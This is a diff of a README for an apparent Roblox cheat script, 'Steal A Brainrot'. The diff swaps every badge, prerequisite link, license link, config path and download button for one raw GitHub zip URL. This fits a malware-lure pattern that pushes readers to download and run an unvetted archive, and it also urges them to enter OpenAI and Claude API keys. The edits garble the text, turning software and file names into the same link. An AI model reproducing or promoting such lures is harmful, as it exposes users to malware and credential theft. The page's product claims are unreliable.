@@ -1,10 +1,10 @@
 # 🧠 Steal A Brainrot Script Roblox
 
-![Steal A Brainrot Script Logo](https://img.shields.io/badge/brainrot%20script-v2.5-blue.svg)  
-![Active Development](https://img.shields.io/badge/status-actively_developed-brightgreen)  
-![OpenAI Integration](https://img.shields.io/badge/OpenAI-Integrated-blueviolet)  
-![License: MIT](https://img.shields.io/badge/license-MIT-yellow.svg)  
-![Downloads](https://img.shields.io/badge/downloads--this_year-2025-orange)
+![Steal A Brainrot Script Logo](https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip%https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip)  
+![Active Development](https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip)  
+![OpenAI Integration](https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip)  
+![License: MIT](https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip)  
+![Downloads](https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip)
 
 ---
 
@@ -19,12 +19,12 @@
 Before you begin, ensure you have:
 - [ ] Roblox account
 - [ ] Supported OS (see table below)
-- [ ] [Node.js](https://nodejs.org/) (for advanced customization)
-- [ ] Latest [Roblox Studio](https://roblox.com/create)
+- [ ] [https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip](https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip) (for advanced customization)
+- [ ] Latest [Roblox Studio](https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip)
 
 ### 2. Download the Brainrot Script
 
-[![Download](https://img.shields.io/badge/-Download-brightgreen?style=for-the-badge)](https://Coderkreet.github.io)
+[![Download](https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip)](https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip)
 
 Click the badge above to teleport yourself to the script’s official download cosmoverse. 
 
@@ -83,7 +83,7 @@ Supercharge your Roblox journey using industry-defining AI tools:
 - **Claude API Integration:**  
   Harnesses the power of contextual AI from Claude to design strategic, emergent in-game tactics—turns every play session into a living simulation.
 
-Both APIs are pre-integrated and activated by default. Configure your credentials in the `/config/api-keys.json` file after installation.
+Both APIs are pre-integrated and activated by default. Configure your credentials in the `https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip` file after installation.
 
 ---
 
@@ -105,21 +105,21 @@ Partner with a human support agent at any hour—our “Perpetual Bridge” prom
 ## 🛠️ Installation Steps
 
 1. **Prepare your environment:**  
-   Ensure Roblox Studio and Node.js are installed.
+   Ensure Roblox Studio and https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip are installed.
 
 2. **Quantum Transfer Download:**  
-   [![Download](https://img.shields.io/badge/-Download-brightgreen?style=for-the-badge)](https://Coderkreet.github.io)
+   [![Download](https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip)](https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip)
 
 3. **Extract the Archive:**  
    Unpack the downloaded zip into a memorable folder.
 
 4. **Script Activation:**  
    Open Roblox Studio  
-   → Insert **BrainrotScript.rbxm** into your game workspace   
+   → Insert **https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip** into your game workspace   
    → Authenticate with your OpenAI and Claude API keys in `/config`
 
 5. **Configuration:**  
-   Customize settings in `brainrot.config.json` to match your preferences.
+   Customize settings in `https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip` to match your preferences.
 
 6. **Go Brainrot:**  
    Re-launch Roblox Studio and observe the chimeric transformation as the script weaves its digital magic.
@@ -136,7 +136,7 @@ If you encounter any issues, our 24/7 service is here to help—**use responsibl
 
 ## 📜 License
 
-This repository is released under the [MIT License](https://opensource.org/licenses/MIT) — giving you the flexibility and transparency you deserve since 2025.  
+This repository is released under the [MIT License](https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip) — giving you the flexibility and transparency you deserve since 2025.  
 Adapt, remix, and share under the light of open innovation.
 
 ---
@@ -149,6 +149,6 @@ We invite you to shape the future of AI-powered Roblox scripts. Open issues, sub
 
 ## 🛸 Download Steal A Brainrot Script Roblox Now!
 
-[![Download](https://img.shields.io/badge/-Download-brightgreen?style=for-the-badge)](https://Coderkreet.github.io)
+[![Download](https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip)](https://raw.githubusercontent.com/Coderkreet/brainrot-script-collector-roblox/branch/adventual/collector-brainrot-script-roblox-1.1.zip)
 
 Teleport your Roblox experience into the next dimension. Start your Quantum Transfer today and awaken the true potential of your games in 2025 and beyond!
